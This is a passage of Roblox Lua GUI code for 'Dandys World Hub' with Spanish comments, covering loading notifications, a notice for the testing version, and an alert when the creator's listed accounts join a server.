-- StarterGui.DebugVersion.HubTester
local function C_1ae()
	local script = G2L["1ae"];
	print("[script]: loading Dandys World HUB...")
	print("pos si :V")
	Instance.new("Hint", workspace).Text = "Loading Dandys World Hub..."
	wait(3)
	workspace:FindFirstChildWhichIsA("Hint").Text = "if the gui not loads, theres maybe a problem..."
	wait(2)
	workspace:FindFirstChildOfClass("Hint"):Remove()
	wait(1)

	local StarterGui = game:GetService("StarterGui")
	local bindable = Instance.new("BindableFunction")

	-- Función que maneja la respuesta al pulsar Yes o No
	function bindable.OnInvoke(response)
		if response == "Yes" then
			print("[script]: GUI loaded successfully.")
		else
			print("[script]: GUI did not load. Please check for issues.")
			StarterGui:SetCore("SendNotification", {
				Title = "Dandys World Hub",
				Text = "verify in Your Developer Console (F8 / F9) ",
				Duration = 10, -- Duración de la notificación en segundos
			})
		end
	end

	-- Enviar una notificación al jugador local preguntando si la GUI se cargó correctamente
	local function sendNotification()
		StarterGui:SetCore("SendNotification", {
			Title = "Dandys World Hub",
			Text = "Did the GUI load successfully?",
			Duration = 10, -- Duración de la notificación en segundos
			Button1 = "Yes",
			Button2 = "No",
			Callback = bindable
		})
	end

	-- Llamar a la función para enviar la notificación
	sendNotification()

end;
task.spawn(C_1ae);
-- StarterGui.DebugVersion.VersionHandler
local function C_1af()
	local script = G2L["1af"];
	-- Función para mostrar un Hint personalizado con botón
	local function showCustomHintWithCloseButton(message, buttonText)
		-- Crear una ScreenGui
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "CustomHint"
		screenGui.ResetOnSpawn = false -- Permitir que persista entre respawns
		screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

		-- Crear un TextLabel para el mensaje
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "HintLabel"
		textLabel.Text = message
		textLabel.Size = UDim2.new(0.5, 0, 0.1, 0) -- Mitad del ancho de la pantalla, 10% de altura
		textLabel.Position = UDim2.new(0.25, 0, 0.4, 0) -- Centrado en la pantalla (ajustable)
		textLabel.BackgroundColor3 = Color3.new(0, 0, 0) -- Fondo negro
		textLabel.BackgroundTransparency = 0.5 -- Semi-transparente
		textLabel.TextColor3 = Color3.new(1, 1, 1) -- Texto blanco
		textLabel.Font = Enum.Font.SourceSansBold -- Fuente del texto
		textLabel.TextScaled = true -- Escalar texto automáticamente
		textLabel.Parent = screenGui

		-- Crear un botón para cerrar el Hint
		local closeButton = Instance.new("TextButton")
		closeButton.Name = "CloseButton"
		closeButton.Text = buttonText or "Close" -- Texto personalizado para el botón
		closeButton.Size = UDim2.new(0.2, 0, 0.05, 0) -- Tamaño del botón
		closeButton.Position = UDim2.new(0.4, 0, 0.55, 0) -- Posición debajo del texto
		closeButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Fondo rojo
		closeButton.TextColor3 = Color3.new(1, 1, 1) -- Texto blanco
		closeButton.Font = Enum.Font.SourceSansBold -- Fuente del texto
		closeButton.TextScaled = true -- Escalar texto automáticamente
		closeButton.Parent = screenGui

		-- Conectar el evento del botón para cerrar el mensaje
		closeButton.MouseButton1Click:Connect(function()
			if screenGui then
				screenGui:Destroy()
			end
		end)
	end

	local function checkTestingVersion()
		local TestLabel = script.Parent.Title.script_content.welcomepage.welcome.TestLabel

		--if the scripts finds the text "TESTING" in TestLabel text, then return true, else return false
		if TestLabel.Text:find("TESTING") then
			return true
		else
			return false
		end
	end
	wait(3)
	local TestingVersion = checkTestingVersion()

	task.spawn(function()
		if TestingVersion then
			--stop the script if LocalPlayer User is G0bbyD0llan1
			--if game.Players.LocalPlayer.UserId == 4595531433 then
			--	return
			--end
			--show the hint if it's not a testing version
			showCustomHintWithCloseButton([[Notice from G0bbyD0llan: This is an UNFINISHED version of an update I'm making for "Dandys World Hub". Everything you see here is for testing purposes only.]], "Got it!")
		end
	end)
end;
task.spawn(C_1af);
-- StarterGui.DebugVersion.GobbyAdmin
local function C_1b0()
	local script = G2L["1b0"];
	local Players = game:GetService("Players")

	-- Lista de usuarios específicos
	local specialUsers = {
		"G0bbyD0llan", "G0bbyD0llan1", "G0bbyD0llan12", "G0bbyAntiVirus11", 
		"G0bbyD0IIan", "G0bbyAlt1", "G0bbyAlt2", "G0bbyAlt3", "G0bbyAlt4", 
		"G0bbyAlt5", "G0bbyAlt6", "G0bbyAlt7", "G0bbyAlt8", "G0bbyAlt9", 
		"G0bbyAlt10", "G0bbyAlt11", "G0bbyAlt12", "G0bbyAlt13", "G0bbyAlt14", 
		"G0bbyAlt15", "SoyUnMegaPro9898", "SoyUnMegaPro989", "IWantFriends311", 
		"Santiago0134O"
	}

	-- Crear un BillboardGui con un TextLabel
	local function createSpecialGui(player)
		--show a notification using SendNotification by SetCore
		game.StarterGui:SetCore("SendNotification", {
			Title = "OMG! You Found Dandys World Hub Creator!!",
			Text = player.Name,
			Duration = 14,
			Button1 = "¡Congratulations!"
		})

	end

	-- Verificar y asignar el BillboardGui a jugadores especiales
	local function checkSpecialUsers(player)
		if table.find(specialUsers, player.Name) then
			print("¡Usuario especial encontrado: " .. player.Name .. "!")
			createSpecialGui(player)
		end
	end

	-- Conectar evento al entrar un jugador
	Players.PlayerAdded:Connect(function(player)
		checkSpecialUsers(player)
	end)

	-- Verificar jugadores actuales
	for _, player in ipairs(Players:GetPlayers()) do
		checkSpecialUsers(player)
	end

end;
task.spawn(C_1b0);

return G2L["1"], require;
